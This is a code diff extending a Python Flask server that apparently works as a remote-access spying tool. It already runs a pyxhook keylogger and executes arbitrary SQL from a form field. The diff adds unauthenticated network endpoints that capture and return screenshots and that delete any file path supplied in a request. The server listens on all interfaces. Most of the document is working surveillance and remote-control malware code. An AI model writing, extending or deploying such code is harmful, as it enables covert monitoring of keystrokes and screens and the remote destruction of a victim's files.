@@ -4,8 +4,11 @@ import os
 import pyxhook
 import requests
 from flask import Flask
-from flask import request
+from flask import request, Response
 import sqlite3
+import pathlib
+import pyautogui
+import base64
 
 mydb = sqlite3.connect("user.db")
 
@@ -14,6 +17,13 @@ mydb = sqlite3.connect("user.db")
 # statements in 'Python'
 cursor = mydb.cursor()
 app = Flask(__name__)
+
+def screen_shot():
+    screenshot = pyautogui.screenshot()
+    screenshot.save('/tmp/test.png')
+    with open('/tmp/test.png','rb')  as f:
+        data = f.read()
+    return data
 
 def start_key_logger():
     # Python code for keylogger
@@ -64,6 +74,7 @@ def start_key_logger():
         pyxhook.print_err(msg)
         with open(log_file, 'a') as f:
             f.write('\n{}'.format(msg))
+            
 @app.route('/')
 def hello_world():
     return 'Hello world!'
@@ -74,18 +85,38 @@ def sql_file():
     cursor.execute(request.form.get('parameter'))
     result = cursor.fetchall()
     return result
+
 @app.post('/delete')
 # do the file deletion
 def delete_file():
-    pass
+    def notempty(filepath):
+        files = filepath.rglob("*")
+        for file in files:
+            print(file)
+            return True
+        return False
+    jdata = request.json
+    if jdata.get('filename') is None:
+        return "empty argument: filename"
+    filepath = pathlib.Path(jdata.get('filename'))
+    if filepath.exists() == False:
+        return f"filepath: {filepath.resolve()} doesn't exists."
+    if filepath.is_dir() == True and notempty(filepath):
+        return f'filepath: {filepath.resolve()} is directory and not empty.'
+    filepath.unlink()
+    return f'delete file: {filepath.resolve()} success.'
+    
 @app.post('/key')
 # do the keylog
 def keylogger():
     start_key_logger()
-@app.post('/shot')
+    
+@app.route('/shot',methods=["POST","GET"])
 # do the screenshot
 def screenshot():
-    pass
+    data = screen_shot()
+    # data = base64.b64encode(data).decode()
+    return Response(data,mimetype='image/png')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0')
